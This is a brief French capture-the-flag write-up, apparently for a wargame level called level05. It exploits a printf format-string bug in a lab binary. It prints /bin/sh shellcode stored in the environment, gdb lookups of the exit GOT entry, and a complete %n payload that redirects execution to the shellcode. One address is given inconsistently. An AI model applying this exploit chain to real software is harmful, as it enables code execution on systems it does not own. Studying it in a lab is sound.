@@ -1,0 +1,45 @@
+On remarque dans gdb qu'il y a un format string sur un printf à la fin du main.
+
+level05@OverRide:~$ python -c 'print "aaaa" + "-%p"*12' | ./level05
+aaaa-0x64-0xf7fcfac0-0xf7ec3af9-0xffffd6ef-0xffffd6ee-(nil)-0xffffffff-0xffffd774-0xf7fdb000-0x61616161-0x2d70252d-0x252d7025
+
+On voit notre input à la 10ème position. On va donc pouvoir réaliser une format string.
+
+On utilise un shellcode, on le stock donc dans l'env:
+export SHELLCODE=`python -c "print '\x90' * 500 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'"`
+
+On retrouve l'adresse d'un NOP de notre shellcode:
+
+x/200xs environ:
+0xffffd6b4:      "SHELLCODE=\220....
+
+x/200xg 0xffffd6b4:
+Une adresse au hasard
+0xffffd8a6
+
+
+On cherche à overwrite une adresse dans la table GOT; on va utiliser la fonction exit située à la fin du main.
+
+(gdb) info function exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0x08048370  exit
+0x08048370  exit@plt
+
+(gdb) x/i 0x08048370
+0x8048370 <exit@plt>:	jmp    *0x80497e0
+
+On peut donc utiliser cette adresse.
+
+
+Cependant, l'adresse de notre NOPLED etant 0xffffd8a4, cela représentant 4294958169 en décimal, ce serait trop long à écrire en une seule fois.
+On va donc séparer l'opération en deux fois.
+
+Pour cela on va prendre notre shellcode NOP addresse et la diviser en deux:
+0xffffd8a6->
+    d8a6 = 55462
+    ffff = 65535
+
+On peut donc créer notre exploit:
+(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55454x" + "%10$n" + "%10073x" + "%11$n"' ; cat) | ./level05
